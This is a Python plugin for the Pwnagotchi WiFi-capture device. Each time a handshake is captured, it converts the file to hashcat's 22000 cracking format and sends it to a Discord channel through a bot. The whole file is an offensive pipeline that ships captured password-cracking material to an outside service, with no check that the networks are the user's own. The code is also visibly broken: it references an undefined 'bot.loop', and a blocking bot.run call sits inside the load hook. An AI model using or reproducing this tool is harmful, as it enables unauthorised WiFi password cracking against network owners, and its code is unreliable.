import os
import subprocess
import logging
import discord
from discord.ext import commands
from pwnagotchi.plugins import Plugin

class pwncord(Plugin):
    __author__ = 'BThomas22x'
    __version__ = '1.0.0'
    __license__ = 'GPLv3'
    __description__ = 'A plugin to convert .pcap files to .22000 and upload them to Discord'

    def __init__(self):
        self.ready = False
        self.bot = None

    def on_loaded(self):
        self.ready = True
        logging.info("[pwncord] Plugin loaded and ready.")
        self._setup_discord_bot()

    def on_handshake(self, filename, access_point, client_station, **kwargs):
        if not self.ready:
            return
        try:
            converted_file = self._convert_to_22000(filename)
            self._upload_to_discord(converted_file)
            logging.info(f"[pwncord] Handshake {filename} converted and uploaded successfully.")
        except Exception as e:
            logging.error(f"[pwncord] Failed to upload file: {e}")

    def _convert_to_22000(self, pcap_file):
        output_file = pcap_file.replace('.pcap', '.22000')
        subprocess.run(['hcxpcapngtool', '-o', output_file, pcap_file], check=True)
        return output_file

    def _setup_discord_bot(self):
        token = self.options['discord_token']
        channel_id = int(self.options['channel_id'])

        bot = commands.Bot(command_prefix='!')

        @bot.event
        async def on_ready():
            logging.info(f'[pwncord] Logged in as {bot.user.name}')
            self.bot = bot

        async def upload_file(file_path):
            channel = bot.get_channel(channel_id)
            await channel.send(file=discord.File(file_path))

        self.upload_file = upload_file
        bot.run(token)

    def _upload_to_discord(self, file_path):
        if self.bot is None:
            logging.error('[pwncord] Discord bot not initialized.')
            return
        bot.loop.create_task(self.upload_file(file_path))
